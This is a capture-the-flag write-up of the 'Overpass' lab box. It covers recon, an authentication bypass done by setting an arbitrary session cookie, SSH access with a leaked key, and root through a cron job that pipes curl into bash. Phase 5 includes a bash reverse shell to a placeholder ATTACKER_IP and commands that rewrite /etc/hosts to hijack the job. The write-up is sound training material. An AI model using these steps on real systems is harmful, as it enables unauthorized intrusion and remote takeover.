---
icon: shield-keyhole
---

# Overpass

Difficulty: <mark style="color:green;">Easy</mark>

## **Overpass:** From Recon to Root - A Tale of Password Managers and Cron Jobs

### **Executive Summary**

What happens when a "military-grade" password manager becomes its own worst enemy? In this engaging CTF-style challenge, we explore Overpass - a password manager that ironically becomes the key to its own compromise. Through a combination of web enumeration, cryptography, and opportunistic cron job exploitation, we'll demonstrate how even security-focused applications can fall victim to poor implementation.

***

### **Phase 1: The Reconnaissance - Finding the Front Door**

#### **Initial Enumeration**

Our journey begins with a simple `nmap` scan, revealing two open ports:

* **Port 22**: SSH (OpenSSH 8.2p1 Ubuntu)
* **Port 80**: HTTP (Golang web server)

The web server greets us with "Overpass" - a password manager boasting "military grade encryption." The irony begins.

bash

```
nmap -sC -sV 10.64.142.194
```

#### **Web Application Discovery**

Exploring the website reveals:

* A clean interface promoting password security
* Navigation to `/aboutus` and `/downloads`
* A login page at the main interface

The HTML source contains an intriguing comment hinting at the encryption type:

html

```
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

**Roman reference?** This screams **Caesar cipher** or **ROT13** - our first clue about the "military grade" encryption.

***

## **Phase 2: Cookie Manipulation - The Golden Ticket**

#### **The Authentication Mystery**

The login page required credentials, but we discovered something intriguing in the JavaScript. The authentication flow was straightforward:

1. Submit credentials to `/api/login`
2. If successful, set a `SessionToken` cookie
3. Redirect to `/admin`

But what if we could bypass authentication entirely?

#### **The Cookie Experiment**

Instead of trying to brute-force credentials, we examined the cookie mechanism. The JavaScript revealed:

javascript

```
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

The key insight: **When authentication succeeds, the server returns the cookie value directly as the response text**, not a JSON object or success message.

#### **Direct Access Attempt**

We tried accessing `/admin` directly:

bash

```
curl http://10.64.142.194/admin
```

Result: Redirect or access denied. The page required authentication.

#### **The Breakthrough**

Remembering how cookies work, we attempted to set a `SessionToken` cookie with a random value:

bash

```
curl -H "Cookie: SessionToken=test" http://10.64.142.194/admin
```

The server responded with: `<a href="/admin/">Moved Permanently</a>`

A 301 redirect! This suggested `/admin` was redirecting to `/admin/` (with trailing slash). More importantly, **the server accepted our cookie without rejecting it outright**.

#### **Following the Redirect**

We tried the trailing slash version:

bash

```
curl -H "Cookie: SessionToken=test" http://10.64.142.194/admin/
```

This time, instead of a redirect or access denied, we got **directory listing enabled**! The `/admin/` directory contained files.

#### **Treasure Discovered**

Among the files in `/admin/`, we found a critical asset found in the admin page <br>

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

This was our golden ticket! The server's lax cookie validation allowed us to access what should have been a protected directory, revealing the encrypted private key that would eventually grant us SSH access.

#### **The Vulnerability**

The web application made two critical mistakes:

1. **Insufficient Cookie Validation**: It accepted any `SessionToken` cookie without verifying its authenticity
2. **Directory Listing Enabled**: The `/admin/` directory exposed sensitive files

#### **Key Command:**

bash

```
# The command that revealed the RSA key
curl -H "Cookie: SessionToken=anything_here" http://10.64.142.194/admin/
```

This simple cookie manipulation bypassed authentication entirely, demonstrating that sometimes the front door isn't locked - you just need to try the handle.

***

### **Phase 3: Initial Access - SSH Shenanigans**

#### **Gaining Foothold**

With the decrypted private key, SSH access is trivial:

bash

```
chmod 600 decrypted.key
ssh -i decrypted.key james@10.64.142.194
```

We're in! First stop: the user flag and some interesting files:

* `user.txt` - The first flag
* `.overpass` - Encrypted credentials file
* `todo.txt` - Developer notes with crucial hints

#### **Decoding the Developer's Secret**

The `.overpass` file contains encoded text. Remembering the Roman hint, we try ROT47:

bash

```
cat .overpass | tr '!-~' 'P-~!-O'
```

Output: `[{"name":"System","pass":"saydrawnlyingpicture"}]`

Bingo! Credentials for the "System" account. But what system?

***

### **Phase 4: Privilege Escalation - The Cron Job Goldmine**

#### **Enumeration Reveals the Treasure**

Checking `sudo -l` shows james isn't in sudoers. Time to dig deeper:

bash

```
cat /etc/crontab
```

The golden ticket reveals itself:

text

```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

**Every minute, root downloads and executes a script from `overpass.thm`!**

#### **DNS Manipulation**

Checking `/etc/hosts`:

text

```
127.0.0.1 overpass.thm
```

The file is world-writable! We can redirect `overpass.thm` to our attacking machine.

***

### **Phase 5: The Attack - Weaponizing Cron**

#### **Setting the Trap**

On our attacking machine (Kali):

bash

```
# Create malicious script
mkdir -p /tmp/web/downloads/src
cd /tmp/web/downloads/src

cat > buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

chmod +x buildscript.sh

# Start web server
cd /tmp/web
sudo python3 -m http.server 80

# Start listener
nc -lvnp 4444
```

#### **Redirecting Traffic**

On the target:

bash

```
# Modify hosts file
echo "ATTACKER_IP overpass.thm" > /etc/hosts.new
cat /etc/hosts | grep -v "overpass.thm" >> /etc/hosts.new
cat /etc/hosts.new > /etc/hosts
```

***

### **Phase 6: Root Access - The Final Payoff**

#### **The Shell Drops**

Within 60 seconds, the cron job fires. Our netcat listener springs to life:

text

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.64.142.194] 34344
bash: cannot set terminal process group (1292): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-64-142-194:/# whoami
root
```

#### **Claiming the Prize**

bash

```
cat /root/root.txt
```

**Root flag captured!** The system is fully compromised.

***

### **Key Takeaways & Lessons Learned**

#### **Vulnerability Chain:**

1. **Weak Encryption Implementation**: The "military grade" encryption was just ROT47
2. **Hardcoded Credentials**: Passwords stored in world-readable files
3. **Insecure Cron Jobs**: Root executing arbitrary remote scripts
4. **Writable System Files**: `/etc/hosts` with improper permissions

***

### **Tools Used:**

* `nmap` - Network enumeration
* `ssh2john.py` & `john` - Password cracking
* `openssl` - RSA key decryption
* `curl` & `python3` - Web server setup
* `netcat` - Reverse shell handling

***

### **Final Thoughts**

This challenge beautifully demonstrates how security tools can become attack vectors when improperly implemented. From the ironic use of "military grade" encryption to the dangerously configured cron job, Overpass serves as a cautionary tale about security theater versus actual security.

Remember: In cybersecurity, sometimes the locksmith's house has the weakest locks. Always validate your security assumptions and implement defense in depth!

**Happy hacking! 🚩**— 0xreru
